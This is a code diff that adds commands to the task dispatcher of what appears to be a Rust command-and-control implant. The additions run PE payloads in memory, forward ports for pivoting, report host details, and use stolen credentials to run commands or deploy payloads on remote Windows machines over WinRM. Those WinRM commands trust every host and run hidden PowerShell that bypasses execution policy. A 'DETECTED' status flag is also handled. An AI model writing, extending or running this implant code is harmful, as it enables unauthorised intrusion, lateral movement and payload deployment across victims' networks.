@@ -43,6 +43,9 @@ mod tcp_pivot;
 #[path = "pipe_server.rs"]
 mod pipe_server;
 
+#[path = "portfwd.rs"]
+mod portfwd;
+
 use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
 use std::sync::{Mutex, OnceLock};
 use std::process::Command;
@@ -1344,6 +1347,149 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
                 Err(err) => t.send_result(task.id, "", &err),
             }
         }
+        // ── Aliases ───────────────────────────────────────────────────────────────
+        "PE_EXEC" => {
+            let payload = &task.payload;
+            if payload.is_empty() {
+                t.send_result(task.id, "", "PE_EXEC requires a PE payload");
+                return;
+            }
+            #[cfg(target_os = "windows")]
+            { let r = pe_exec::exec_pe(payload); t.send_result(task.id, &r, ""); }
+            #[cfg(not(target_os = "windows"))]
+            t.send_result(task.id, "", "PE_EXEC: not supported on this platform");
+        }
+
+        // ── Env shortcuts ─────────────────────────────────────────────────────
+        "USERPROFILE" | "HOME" => {
+            let v = std::env::var("USERPROFILE")
+                .or_else(|_| std::env::var("HOME"))
+                .unwrap_or_default();
+            t.send_result(task.id, &v, "");
+        }
+        "USERDOMAIN" => {
+            let v = std::env::var("USERDOMAIN").unwrap_or_default();
+            t.send_result(task.id, &v, "");
+        }
+        "TEMP" => {
+            let v = std::env::var("TEMP")
+                .or_else(|_| std::env::var("TMP"))
+                .unwrap_or_else(|_| std::env::temp_dir().to_string_lossy().into_owned());
+            t.send_result(task.id, &v, "");
+        }
+        "DISPLAY" => {
+            let v = std::env::var("DISPLAY").unwrap_or_else(|_| "(no DISPLAY)".to_string());
+            t.send_result(task.id, &v, "");
+        }
+
+        // ── Network ───────────────────────────────────────────────────────────
+        "NETSTAT" => {
+            let out = shell("netstat -ano");
+            t.send_result(task.id, &out, "");
+        }
+
+        // ── Port forwarding ───────────────────────────────────────────────────
+        "PORTFWD_ADD" => {
+            // Args: "[tcp|udp] <lport> <rhost> <rport>"
+            let parts: Vec<&str> = task.args.split_whitespace().collect();
+            let (proto, rest) = if parts.first().map(|p| *p == "tcp" || *p == "udp").unwrap_or(false) {
+                (parts[0], &parts[1..])
+            } else {
+                ("tcp", parts.as_slice())
+            };
+            if rest.len() < 3 {
+                t.send_result(task.id, "", "usage: [tcp|udp] <lport> <rhost> <rport>");
+                return;
+            }
+            let lport = rest[0].parse::<u16>().unwrap_or(0);
+            let rport = rest[2].parse::<u16>().unwrap_or(0);
+            if lport == 0 || rport == 0 {
+                t.send_result(task.id, "", "invalid port numbers");
+                return;
+            }
+            let out = portfwd::portfwd_add(proto, lport, rest[1], rport);
+            t.send_result(task.id, &out, "");
+        }
+        "PORTFWD_DEL" => {
+            // Args: "[tcp|udp] <lport>"
+            let parts: Vec<&str> = task.args.split_whitespace().collect();
+            let (proto, port_str) = if parts.len() == 2 && (parts[0] == "tcp" || parts[0] == "udp") {
+                (parts[0], parts[1])
+            } else {
+                ("tcp", parts.first().copied().unwrap_or("0"))
+            };
+            let lport = port_str.parse::<u16>().unwrap_or(0);
+            if lport == 0 {
+                t.send_result(task.id, "", "usage: [tcp|udp] <lport>");
+                return;
+            }
+            let out = portfwd::portfwd_del(proto, lport);
+            t.send_result(task.id, &out, "");
+        }
+        "PORTFWD_LIST" => {
+            t.send_result(task.id, &portfwd::portfwd_list(), "");
+        }
+
+        // ── WinRM ─────────────────────────────────────────────────────────────
+        "WINRM_EXEC" => {
+            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
+            let target = j["target"].as_str().unwrap_or("");
+            let user   = j["user"].as_str().unwrap_or("");
+            let pass   = j["pass"].as_str().unwrap_or("");
+            let cmd    = j["cmd"].as_str().unwrap_or("");
+            if target.is_empty() || cmd.is_empty() {
+                t.send_result(task.id, "", "WINRM_EXEC: {\"target\",\"user\",\"pass\",\"cmd\"} required");
+                return;
+            }
+            let trust = format!(
+                "Set-Item WSMan:\\localhost\\Client\\TrustedHosts -Value * -Force -EA SilentlyContinue;\
+                 try{{$ip=([System.Net.Dns]::GetHostAddresses('{target}')|Where-Object{{$_.AddressFamily -ne 23}}|Select-Object -First 1).IPAddressToString}}catch{{$ip='{target}'}};",
+                target = target
+            );
+            let ps = format!(
+                "{trust}$c=New-Object PSCredential('{user}',(ConvertTo-SecureString '{pass}' -AsPlainText -Force));\
+                 Invoke-Command -ComputerName $ip -Authentication Negotiate -Credential $c -ScriptBlock {{{cmd}}}",
+                trust = trust, user = user, pass = pass, cmd = cmd
+            );
+            let ps_escaped = ps.replace('"', "\\\"");
+            let out = shell(&format!("powershell -NoP -W Hidden -Exec Bypass -C \"{}\"", ps_escaped));
+            t.send_result(task.id, &out, "");
+        }
+        "WINRM_DEPLOY" => {
+            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
+            let target  = j["target"].as_str().unwrap_or("");
+            let user    = j["user"].as_str().unwrap_or("");
+            let pass    = j["pass"].as_str().unwrap_or("");
+            let payload = j["payload"].as_str().unwrap_or("");
+            if target.is_empty() || payload.is_empty() {
+                t.send_result(task.id, "", "WINRM_DEPLOY: {\"target\",\"user\",\"pass\",\"payload\"} required");
+                return;
+            }
+            let trust = format!(
+                "Set-Item WSMan:\\localhost\\Client\\TrustedHosts -Value * -Force -EA SilentlyContinue;\
+                 try{{$ip=([System.Net.Dns]::GetHostAddresses('{target}')|Where-Object{{$_.AddressFamily -ne 23}}|Select-Object -First 1).IPAddressToString}}catch{{$ip='{target}'}};",
+                target = target
+            );
+            let ps = format!(
+                "{trust}$c=New-Object PSCredential('{user}',(ConvertTo-SecureString '{pass}' -AsPlainText -Force));\
+                 Invoke-Command -ComputerName $ip -Authentication Negotiate -Credential $c -AsJob -ScriptBlock {{{payload}}} | Out-Null",
+                trust = trust, user = user, pass = pass, payload = payload
+            );
+            let ps_escaped = ps.replace('"', "\\\"");
+            let out = shell(&format!("powershell -NoP -W Hidden -Exec Bypass -C \"{}\"", ps_escaped));
+            t.send_result(task.id, &out, "");
+        }
+
+        // ── BOF store (stub — use BOF with direct payload) ────────────────────
+        "BOF_STORE_LOAD" | "BOF_STORE_LIST" | "BOF_STORE_UNLOAD" => {
+            t.send_result(task.id, "(bof store not supported in Rust agent — use BOF with payload)", "");
+        }
+
+        // ── Agent state ───────────────────────────────────────────────────────
+        "DETECTED" => {
+            t.send_result(task.id, "[!] DETECTED flag acknowledged", "");
+        }
+
         _ => {
             // Delegate to feature modules
             #[cfg(target_os = "windows")]
